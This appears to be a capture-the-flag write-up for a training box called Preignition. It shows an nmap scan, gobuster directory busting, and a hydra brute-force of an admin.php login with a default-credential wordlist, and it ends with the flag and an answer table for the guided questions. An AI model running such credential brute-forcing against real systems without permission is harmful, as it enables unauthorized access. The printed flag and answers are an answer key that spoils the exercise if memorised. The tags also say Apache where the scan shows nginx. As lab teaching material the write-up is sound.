# Preignition

|            |                                                                                       |
|------------|---------------------------------------------------------------------------------------|
| Track      | Starting Point - Tier 0                                                               |
| Difficulty | Very Easy                                                                             |
| OS         | Linux                                                                                 |
| Tags       | Web, Custom Applications, Apache, Reconnaissance, Site Discovery, Default Credentials |
| Tools      | `nmap`, `gobuster`, `hydra`                                                           |

## Summary

A web host running nginx. Directory busting reveals an `admin.php` page that
accepts the default `admin:admin` login. The flag drops once we authenticate.

## Recon

```bash
nmap -sV -p 80 10.129.199.239
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.2
```

## Enumeration

Run `gobuster` against the root, looking for PHP pages:

```bash
gobuster dir -w /usr/share/dirb/wordlists/common.txt -u http://10.129.199.239 -x php
```

```
/admin.php            (Status: 200) [Size: 999]
```

## Foothold

Visiting `admin.php` shows a login form. The form posts username/password
fields and returns "Wrong username or password" on failure, which gives us a
clean error string for `hydra` to anchor on.

Build a small wordlist of common defaults:

```bash
cat << 'EOF' > wordlist.txt
admin:password
root:root
root:admin
user:user
user:password
admin:admin
EOF
```

Brute-force with `hydra` using the combo list (`-C`):

```bash
hydra -C wordlist.txt 10.129.199.239 http-post-form \
  "/admin.php:username=^USER^&password=^PASS^:Wrong username or password"
```

```
[80][http-post-form] host: 10.129.199.239   login: admin   password: admin
```

Logging in as `admin:admin` returns the flag in the page body.

## Flag

```
6483bee07c1c1d57f14e5b0717503c73
```

## References

- [Hydra POST form bruteforce tutorial](https://infinitelogins.com/2020/02/22/how-to-brute-force-websites-using-hydra/)

## Guided Tasks

| # | Question | Answer |
|---|----------|--------|
| 1 | Directory Brute-forcing is a technique used to check a lot of paths on a web server to find hidden pages. Which is another name for this? | dir busting |
| 2 | What switch do we use for nmap's scan to specify that we want to perform version detection? | -sV |
| 3 | What does Nmap report is the service identified as running on port 80/tcp? | http |
| 4 | What server name and version of service is running on port 80/tcp? | nginx 1.14.2 |
| 5 | What switch do we use to specify to Gobuster we want to perform dir busting specifically? | dir |
| 6 | When using gobuster to dir bust, what switch do we add to make sure it finds PHP pages? | -x php |
| 7 | What page is found during our dir busting activities? | admin.php |
| 8 | What is the HTTP status code reported by Gobuster for the discovered page? | 200 |
| Flag | Submit Root Flag | `6483bee07c1c1d57f14e5b0717503c73` |
